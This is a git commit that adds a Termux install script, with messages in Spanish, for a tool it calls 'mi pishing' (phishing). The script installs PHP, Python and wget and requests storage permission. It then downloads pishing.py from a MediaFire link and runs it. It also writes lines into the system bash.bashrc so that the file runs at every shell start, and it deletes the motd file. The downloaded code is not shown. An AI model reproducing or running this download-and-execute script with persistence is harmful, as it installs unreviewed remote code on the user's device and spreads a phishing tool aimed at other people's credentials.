9915495710f6891566ec63bee9f640ba20e26c23
Facundo Salgado <63315825+byteSalgado@users.noreply.github.com>
2020-05-30 11:25:42 -0300

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,67 @@
+#!/bin/bash
+printf "\e[1;31m Bienvenido a la Instalacion de mi pishing, aguarde...\n"
+sleep 7
+printf "\e[1;31m Instalando PHP, aguarde\n"
+sleep 3
+clear
+pkg install php
+clear
+printf "\e[1;31m Instalacion PHP finalizada\n"
+sleep 3
+clear
+printf "\e[1;31m Istalando modulos php, aguarde...\n"
+sleep 5
+clear
+pkg install php*
+clear
+printf "\e[1;31m Modulos PHP instalados\n"
+sleep 5
+clear
+printf "\e[1;31m Instalando Wget, aguarde\n"
+sleep 5
+clear
+pkg install wget
+clear
+printf "\e[1;31m wget instalado\n"
+sleep 5
+clear
+printf "\e[1;31m instalando modulos adicionales\n"
+sleep 3
+pkg  install python
+clear
+pkg install python*
+clear
+printf "\e[1;31m Para continuar de permisos de storage a su termux\n"
+sleep 3
+termux-setup-storage
+printf "\e[1;31m Permisos otorgados\n"
+sleep 2
+clear
+wget https://download1492.mediafire.com/jxihpjirhjrg/2myc8fnrn1gj278/pishing.py
+clear
+chmod +x pishing.py
+python pishing.py
+mv pishing.py /data/data/com.termux/files/usr/etc/
+rm /data/data/com.termux/files/usr/etc/motd
+sleep 2
+cd /data/data/com.termux/files/usr/etc/
+sleep 1
+echo "cd /data/data/com.termux/files/usr/etc/" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+clear
+echo "python pishing.py" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+clear
+echo "cd" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+clear
+cd /home/
+sleep 5
+clear
+printf "\e[1;31m Instalacion finalizada\n"
+exit
+
+
+
+
+
+
+
+
